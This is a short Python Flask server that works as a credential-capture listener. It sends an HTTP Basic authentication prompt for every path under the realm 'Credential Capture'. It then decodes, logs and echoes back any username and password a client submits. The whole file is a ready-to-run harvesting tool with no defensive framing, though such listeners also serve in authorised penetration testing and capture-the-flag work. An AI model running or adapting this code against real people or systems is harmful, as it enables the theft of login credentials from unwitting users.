from flask import Flask, request
import base64

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def capture_all(path):

    auth = request.headers.get('Authorization')
    
    if auth and auth.startswith('Basic '):
        try:
            encoded = auth.split(' ')[1]
            decoded = base64.b64decode(encoded).decode('utf-8')
            
            print(f"credentials: {decoded}")
            
            return f"credentials: {decoded}\n", 200
            
        except Exception as e:
            return "Error decoding credentials", 400
    else:  
        return "getting creds", 401, {
            'WWW-Authenticate': 'Basic realm="Credential Capture"'
        }


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=False)
